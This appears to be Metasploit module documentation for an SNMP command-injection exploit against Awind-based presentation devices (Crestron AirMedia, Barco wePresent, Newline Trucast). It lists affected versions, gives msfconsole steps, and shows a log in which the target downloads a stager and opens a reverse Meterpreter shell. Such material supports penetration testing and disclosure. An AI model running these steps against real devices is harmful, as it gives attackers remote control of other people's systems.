## Vulnerable Application

This module exploits a vulnerability found in AwindInc and OEM'ed products where untrusted inputs are fed to `ftpfw.sh` system command, leading to command injection.

Note: a valid SNMP read-write community is required to exploit this vulnerability.

The following devices are known to be affected by this issue:

* Crestron Airmedia AM-100 <= version 1.5.0.4
* Crestron Airmedia AM-101 <= version 2.5.0.12
* Awind WiPG-1600w <= version 2.0.1.8
* Awind WiPG-2000d <= version 2.1.6.2
* Barco wePresent 2000 <= version 2.1.5.7
* Newline Trucast 2 <= version 2.1.0.5
* Newline Trucast 3 <= version 2.1.3.7

Other devices might be affected by the same issue but lack of access to firmware forbids me from confirming that. See https://github.com/QKaiser/awind-research for full list of similar devices.

## Verification Steps

1. Start `msfconsole`
2. Do: `use exploit/linux/snmp/awind_snmp_exec`
3. Do: `set payload linux/armle/meterpreter/reverse_tcp`
4. Do: `set RHOST [IP]`
5. Do: `set LHOST [IP]`
6. Do: `run`

You should get a session.

## Scenarios

```
msf5 > use exploit/linux/snmp/awind_snmp_exec
msf5 exploit(linux/snmp/awind_snmp_exec) > set payload linux/armle/meterpreter/reverse_tcp 
payload => linux/armle/meterpreter/reverse_tcp
msf5 exploit(linux/snmp/awind_snmp_exec) > set RHOSTS 192.168.100.2
RHOSTS => 192.168.100.2
msf5 exploit(linux/snmp/awind_snmp_exec) > set LHOST 192.168.100.1
LHOST => 192.168.100.1
msf5 exploit(linux/snmp/awind_snmp_exec) > check

[*] Target system is Crestron Electronics AM-100 (Version 2.6.0.6)
[+] 192.168.100.2:161 The target is vulnerable.
msf5 exploit(linux/snmp/awind_snmp_exec) > run

[*] Started reverse TCP handler on 192.168.100.1:4444 
[*] Using URL: http://0.0.0.0:8080/u70HALC
[*] Local IP: http://192.168.1.10:8080/u70HALC
[*] Injecting payload
[*] Injection successful
[*] Triggering call
[*] Trigger successful
[*] Client 192.168.100.2 (Wget) requested /u70HALC
[*] Sending payload to 192.168.100.2 (Wget)
[*] Sending stage (806872 bytes) to 192.168.100.2
[*] Command Stager progress - 100.00% done (113/113 bytes)
[*] Meterpreter session 2 opened (192.168.100.1:4444 -> 192.168.100.2:38009) at 2019-03-28 11:01:41 +0100
[*] Server stopped.

meterpreter > sysinfo
Computer     : Crestron.AirMedia-1.1.wm8750
OS           :  (Linux 2.6.32.9-default)
Architecture : armv6l
BuildTuple   : armv5l-linux-musleabi
Meterpreter  : armle/linux
```
